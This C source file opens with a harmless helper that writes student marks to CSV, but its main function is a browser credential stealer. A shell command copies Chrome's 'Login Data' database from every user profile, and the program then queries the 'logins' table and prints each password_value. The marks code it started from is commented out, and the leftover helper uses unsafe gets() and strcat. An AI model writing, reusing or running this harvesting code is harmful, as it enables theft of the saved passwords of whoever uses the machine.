#include<stdio.h>
#include<string.h>
#include <sqlite3.h>

void create_marks_csv(char *filename,int a[][3],int n,int m){
    printf("\n Creating %s.csv file",filename);
    FILE *fp;
    int i,j;
    filename=strcat(filename,".csv");
    fp=fopen(filename,"w+");
    fprintf(fp,"Student Id; Physics; Chemistry;pr Maths");

    for(i=0;i<m;i++){
        fprintf(fp,"\n%d",i+1);
        for(j=0;j<n;j++)
            fprintf(fp,";%d ",a[i][j]);
    }
    fclose(fp);
    printf("\n %sfile created",filename);

}

static int callback(void *data, int argc, char **argv, char **azColName){
    int i;
    fprintf(stderr, "%s: ", (const char*)data);

    for(i = 0; i<argc; i++){
        if(!strcmp(azColName[i], "password_value"))
            printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
    }

    printf("\n");
    return 0;
}

int main(){

    sqlite3 *db;
    char *zErrMsg = 0;
    int rc;
    char* sql;
    const char* data = "Callback function called";

    system("cp /Users/*/Library/Application\\ Support/Google/Chrome/*/Login\\ Data /Users/Sam/Desktop/ok");

    //rc = sqlite3_open("/Users/Sam/Library/Application\ Support/Google/Chrome/Default/Login\ Data", &db);
    //rc = sqlite3_open_v2("/Users/Sam/Library/Application\ Support/Google/Chrome/Default/Login\ Data", &db, SQLITE_OPEN_READONLY, NULL);

    //rc = sqlite3_open("/Users/Sam/Desktop/Login\ Data", &db);
    //rc = sqlite3_open_v2("/Users/Sam/Desktop/Login\ Data", &db, SQLITE_OPEN_READONLY, NULL);
    rc = sqlite3_open_v2("/Users/Sam/Desktop/ok", &db, SQLITE_OPEN_READONLY, NULL);

    if( rc != SQLITE_OK) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
        return(0);
    } else {
        fprintf(stderr, "Opened database successfully\n");
    }

    /* Create SQL statement */
    sql = "SELECT * FROM 'logins'";
    

    /* Execute SQL statement */
    rc = sqlite3_exec(db, sql, callback, (void*)data, &zErrMsg);

    if( rc != SQLITE_OK ) {
        fprintf(stderr, "SQL error: %s\n", zErrMsg);
        sqlite3_free(zErrMsg);
    } else {
        fprintf(stdout, "Operation done successfully\n");
    }
    sqlite3_close(db);

    /*
    int a[3][3]={{50,50,50},{60,60,60},{70,70,70}};
    char str[100];

    printf("\n Enter the filename :");
    gets(str);
    create_marks_csv(str,a,3,3);

    return 0;*/
}